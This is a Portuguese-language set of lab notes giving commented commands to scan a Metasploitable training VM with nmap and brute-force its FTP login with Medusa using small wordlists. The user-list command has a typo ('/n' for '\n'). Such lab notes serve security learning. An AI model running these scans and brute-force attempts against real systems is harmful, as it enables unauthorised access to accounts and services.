// Comando para usar no Metasploitable para saber qual seu ip
ip a

// Comando para saber se as máquinas estão conectadas
Ping -c 3 192.168.56.101
// O commando ping testa a conectividade entre as duas máquinas, -c serve para o ping parar com numero X de pacotes, nesse caso 3. Use o Ip recebido no primeiro comando

// Comando para descobrir quais portas estão abertas ao testar por elas
nmap -sV -p 21,22,80,445,139 192.168.56.101
//-sV usado para saber a versão do serviço e -p para listar as portas que queremos buscar, nmap é a ferramenta usada.

// Com a descoberta da porta 21 (ftp) aberta, podemos acessar o Metasploitable por meio do comando
ftp 192.168.56.101

// Comando utilizado para criar uma lista de usuários
echo -e "user\nmsfadmin/nadmin/nroot" > users.txt
// -e usado para interpretar o restante como um código

// Comando utilizado para criar uma lista de senhas
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

//Comando para usar força bruta por meio da Medusa
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
// -h mostra o alvo, -U mostra onde ta a lista de usuarios, -P mostra a lista de senhas, -M mostra que vamos atacar o ftp e -t mostra quantas threads vamos usar
